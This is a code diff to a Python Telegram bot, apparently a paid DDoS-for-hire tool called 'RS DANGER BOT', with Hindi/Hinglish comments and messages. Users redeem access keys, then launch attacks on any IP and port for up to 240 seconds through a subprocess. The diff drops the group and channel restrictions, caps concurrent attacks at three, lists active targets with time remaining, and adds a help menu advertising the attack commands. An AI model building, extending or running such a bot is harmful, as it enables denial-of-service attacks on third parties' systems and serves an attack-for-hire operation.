@@ -21,7 +21,7 @@ SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 ADMINS = [7129010361]  # Admin IDs
 
 # ✅ Data Save करने के लिए JSON फाइल
-DATA_FILE = "bot_data.json"
+DATA_FILE = "bot_Truedata.json"
 
 # ✅ बॉट स्टार्ट होते ही डेटा लोड करो
 def load_data():
@@ -165,9 +165,11 @@ def my_info(message):
 
     bot.reply_to(message, info_msg, parse_mode="Markdown")
 
-# ✅ Existing /RS Attack System (No Change)
+MAX_ACTIVE_ATTACKS = 3  # एक समय में मैक्स 3 अटैक
+
 @bot.message_handler(commands=['RS'])
 def handle_attack(message):
+    global active_attacks
     user_id = message.from_user.id
     command = message.text.split()
 
@@ -175,12 +177,8 @@ def handle_attack(message):
         bot.reply_to(message, "❌ PEHLE /redeem KARKAY ACCESS LO!")
         return
 
-    if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
-        return
-
-    if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
+    if len(active_attacks) >= MAX_ACTIVE_ATTACKS:
+        bot.reply_to(message, "🚫 MAXIMUM 3 ATTACK ALLOWED! PEHLE WALE ATTACK KHATAM HONE DO!")
         return
 
     if len(command) != 4:
@@ -200,7 +198,7 @@ def handle_attack(message):
         bot.reply_to(message, "🚫 240S SE ZYADA ALLOWED NAHI HAI!")
         return
 
-    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`! 📸SCREENSHOT OPTIONAL HAI, LEKIN AGAR BHEJOGE TO CHANNEL PE FORWARD HOGA!"
+    confirm_msg = f"🔥 ATTACK DETAILS:\n🎯 TARGET: `{target}`\n🔢 PORT: `{port}`\n⏳ DURATION: `{time_duration}S`\nSTATUS: `CHAL RAHA HAI...`"
     bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
     attack_info = {"user_id": user_id, "target": target, "port": port, "time": time_duration}
@@ -216,22 +214,51 @@ def handle_attack(message):
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
         finally:
-            bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 📸 SCREENSHOT BHEJOGE TO CHANNEL PE CHALA JAYEGA!🎯")
+            active_attacks.remove(attack_info)
+            bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 📸 SCREENSHOT BHEJOGE TO CHANNEL PE CHALA JAYEGA!")
 
     threading.Thread(target=attack_execution).start()
 
 # ✅ Existing /CHECK Command (No Change)
 @bot.message_handler(commands=['check'])
 def check_attacks(message):
+    global active_attacks
+
+    # ✅ Expired अटैक्स को हटाओ
+    current_time = time.time()
+    active_attacks = [attack for attack in active_attacks if attack['end_time'] > current_time]
+
     if not active_attacks:
         bot.reply_to(message, "❌ KOI BHI ATTACK ACTIVE NAHI HAI!")
         return
 
     check_msg = "📊 **ACTIVE ATTACKS:**\n\n"
-    for attack in active_attacks:
-        check_msg += f"👤 `{attack['user_id']}` ➝ 🎯 `{attack['target']}:{attack['port']}` ({attack['time']}s)\n"
+    for idx, attack in enumerate(active_attacks, start=1):
+        remaining_time = int(attack['end_time'] - current_time)
+        check_msg += f"🔹 **Attack {idx}**\n👤 **User:** `{attack['user_id']}`\n🎯 **Target:** `{attack['target']}:{attack['port']}`\n⏳ **Time Left:** `{remaining_time}s`\n\n"
 
     bot.send_message(message.chat.id, check_msg, parse_mode="Markdown")
 
 # START BOT
-bot.polling(none_stop=True)
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    start_msg = """🔥 **RS DANGER BOT** 🔥
+    
+👋 **WELCOME TO RS DANGER BOT!**  
+🚀 **HERE ARE ALL AVAILABLE COMMANDS:**
+
+🔹 `/start` - **View bot info & commands**  
+🔹 `/redeem <KEY>` - **Redeem key to get access**  
+🔹 `/genkey <DAYS> [HOURS]` - **Generate new key (Admin Only)**  
+🔹 `/RS <IP> <PORT> <TIME>` - **Launch an attack (Max 3 at a time)**  
+🔹 `/check` - **Check all active attacks**  
+🔹 `/myinfo` - **View your details (ID, Attacks, Expiry, etc.)**  
+
+📌 **IMPORTANT RULES:**  
+- **Max 3 attacks can run at the same time.**  
+- **Each attack is limited to 240 seconds.**  
+- **Screenshot verification system is enabled.**  
+
+⚡ **BOT DEV:** [@R_SDanger](https://t.me/R_SDanger)
+"""
+    bot.send_message(message.chat.id, start_msg, parse_mode="Markdown", disable_web_page_preview=True)
